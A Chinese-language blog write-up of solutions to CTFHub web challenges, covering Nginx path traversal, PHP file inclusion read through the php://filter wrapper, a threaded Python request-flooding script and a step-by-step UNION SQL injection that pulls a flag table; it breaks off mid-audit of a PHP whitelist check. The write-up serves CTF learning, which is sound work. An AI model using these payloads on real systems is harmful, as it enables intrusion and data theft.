---
title: "CTFHub——Web题总结"
date: 2021-03-19T21:22:55+08:00
showDate: true
draft: false
tags: ["security","ctfhub", "ctf"]
categories: ["security"]
---

# 0x00 前言

之前接触到一个国内的ctf平台ctfhub，于是趁热做了一波题目，这里把记录一下自己的解题过程


# 0x01 题目列表


## 第一题 afr-2 

### 解题过程

这道题一进来就是文字加gif

![1-1.png](1-1.png)

直接先看源代码

![1-2.png](1-2.png)

有一个img/img.gif路径，去掉文件名，开了目录访问。

![1-3.png](1-3.png)

根据题目的考点——文件读取，试试目录穿越，把访问的路径改为`/img../`。直接跳到根目录了，flag也刚好就在根目录

![1-4.png](1-4.png)

点击下载即可拿到flag

### 参考资料

[三个案例看Nginx配置安全](https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html)


## 第二题 afr-1

### 解题过程

这道题进来是一个helloword界面，但是url里面有一个`?p=hello`的参数

![2-1.png](2-1.png)


先fuzz一下参数p，发现，当`p=index`的时候，服务器会返回502，这个时候猜测，这个服务的逻辑应该是 `include($_GET['p'] . ".php")`，然后由于包含自身，导致了502。

这个时候可以使用伪协议来读取文件

令`?p=php://filter/read=convert.base64-encode/resource=index`

这个时候服务端返回了一串base64串，解码一下得到源码，跟我们猜的基本一样。

![2-2.png](2-2.png)

这个时候，既然是ctf，就猜一下flag是不是当前目录的flag.php（虽然这个猜很没有道理，但是毕竟都是套路）

访问`?p=php://filter/read=convert.base64-encode/resource=flag`

通过base64解出flag

![2-3.png](2-3.png)


### 参考资料

[文件包含漏洞与PHP伪协议](https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/)

## 第三题 checkin

### 解题过程

此题没有解题过程，flag就在根url响应头中

![3-1.png](3-1.png)

### 参考资料


## 第四题 random

### 解题过程

按照惯例，先看源码

![4-1.png](4-1.png)

有个参数`num=1`，然后有个随机的数字显示，表单提交会改变num的值，然后还有个提示`tips: 也许你可以试试守株待兔`

这应该是说让我们猜下一个数字是啥，然后如果相等了可能会有有什么不一样的。

这个直接爆破就好了。爆破代码
```python
# coding: utf-8
import requests
import threading

proxies = {"http": "http://127.0.0.1:8080"}

def req():
    global proxies
    url = "http://challenge-c1a7fca6f44dce41.sandbox.ctfhub.com:10080/index.php?num=1"
    requests.get(url, proxies=proxies)

def loop_req():
    while True:
        req()

if __name__ == '__main__':
    for i in range(10):
        t = threading.Thread(target=loop_req)
        t.setDaemon(True)
        t.start()
    while True:
        continue
```

加代理方便在burpsuite看结果，成功爆出flag

![4-2.png](4-2.png)

## 第五题 injection

### 解题过程

路径带参数为`/index.php?id=1`，id改成1，2，3有不同的结果，

尝试payload`/index.php?id=1 and 1=1`和`/index.php?id=1 and 1=2`，前者正常返回，后者异常，可以推断出int注入。

用union来注入
`/index.php?id=1 union select 1,2`正常返回，说明返回了两个字段

`/index.php?id=1 union select 1,database()` ==> 数据库名为ctfhub

`/index.php?id=1  union select 1,(select table_name from information_schema.tables where table_schema='ctfhub' limit 1)` ==> 存在表名flag

`/index.php?id=1 union select 1,(select column_name from information_schema.columns where table_schema='ctfhub' and table_name='flag' limit 1)` ==> flag表中存在字段flag

`/index.php?id=1 union select 1,(select flag from flag limit 1)` ==> 拿到flag

![5-1.png](5-1.png)

## 第六题 warmup

### 解题过程

上来就是个滑稽大哥

![6-1.png](6-1.png)

先看源码，有个source.php的注释，应该是提示。

![6-2.png](6-2.png)

访问source.php，有源码，看来是审计题

![6-3.png](6-3.png)

先分析一波源码。

传入参数`file`，校验是否为空或者为字符串，并校验参数内容，都满足的话则包含file。

关键是这个`checkFile`函数。 
第一个if
```php
if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
    }
```
用来校验参数`$page`是否已设置或者为NULL或者是否是string。这个if感觉好像是不会被触发的，因为调用函数前已经校验过。

第二个if
```php
$whitelist = ["source"=>"source.php","hint"=>"hint.php"];
if (in_array($page, $whitelist)) {
                return true;
            }
```

如果`$page`是`source.php`或者`hint.php`就会返回true

定义变量`$_page`

```php
    $_page = mb_substr(
        $page,
        0,
        mb_strpos($page . '?', '?')
    );
```
`mb_substr`的作用是取字符串的子串，然后`mb_strpos`的作用是取某个字符串在另一个字符串第一次出现的位置。

假设`$page`变量中没有`?`，那这里`mb_strpos`返回的就是`$page`的长度。

第三个if
``
